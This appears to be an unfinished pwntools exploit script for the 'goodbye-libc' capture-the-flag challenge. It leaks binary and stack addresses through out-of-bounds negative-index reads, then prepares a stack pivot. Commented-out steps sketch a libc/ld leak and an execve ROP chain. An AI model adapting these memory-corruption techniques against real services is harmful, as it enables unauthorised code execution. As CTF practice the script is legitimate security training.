#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('goodbye-libc_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
ld = ELF('ld-linux-x86-64.so.2', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        # b*0x555555555264
        # b*0x555555555200
        # b*input_num+142
        b*_start+302
        b*_start+1935
        b*_start+1829
        b*_start+274
        b*_start+264
        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote("streams.tamuctf.com", 443, ssl=True, sni="goodbye-libc")
else:
    p = process([exe.path])

def write(idx, num):
    sna(b'Enter input: ', 1)
    sa(b'Select index to write to [1-3]: ', idx)
    sa(b'Select value to write: ', num)

def add(idx1, idx2):
    sna(b'Enter input: ', 2)
    sna(b'Select first index to add [1-3]: ', idx1)
    sna(b'Select second index to add [1-3]: ', idx2)

def show(idx):
    sna(b'Enter input: ', 6)
    sna(b'Select index to read from [1-3]: ', idx)

# write(b'4294967295', b'1%p\0\0\0\0') # idx = -1,  write saved rip
# write(b'1', b'37')
# write(2, 0)
show(4294967295) # -1
p.recvuntil(b'Value written: ')

binary_leak = int(p.recvline()[:-1], 10)
exe.address = binary_leak - 0x1cbd
info(f'binary leak: {hex(binary_leak)}')
info(f'binary base: {hex(exe.address)}')

show(4294967294) # -2
p.recvuntil(b'Value written: ')

stack_leak = int(p.recvline()[:-1], 10)
info(f'stack leak: {hex(stack_leak)}')
# 


leave_ret = 0x00000000000011e5 + exe.address
info(f'address of leave_ret {hex(leave_ret)}')
write(b'3', b'29400045130965551\n')

# write(b'4294967295', f'{exe.sym._start}'.encode() + b'\n')

# GDB()

# fake rbp


# write(b'4294967294', f'{stack_leak-0xc8}'.encode() + b'\n')
# # write(b'4294967294', f'{stack_leak-0x60}'.encode() + b'\n')

# show(1)
# p.recvuntil(b'Value written: ')
# ld_leak = int(p.recvline()[:-1], 10)
# info(f'ld leak: {hex(ld_leak)}')
# ld.address = ld_leak - 0x33ad0
# info(f'ld base: {hex(ld.address)}')
# libc.address = ld_leak - 0x41ad0
# info(f'libc base: {hex(libc.address)}')

# pop_rdi = 0x000000000000324f + ld.address
# pop_rsi = 0x0000000000003b6a + ld.address
# pop_rax_rdx_rbp = 0x000000000001ab9e + ld.address
# syscall = 0x000000000000a083 + ld.address

# rdi_rsi_rdx = 0x103f + libc.address

# write(b'3', f'{syscall}'.encode() + b'\n')

# write(b'2', b'a')
# write(b'1', b'a')
# write(b'0', b'59')
 
GDB()
# write(b'4294967294', b'123')


p.interactive()


        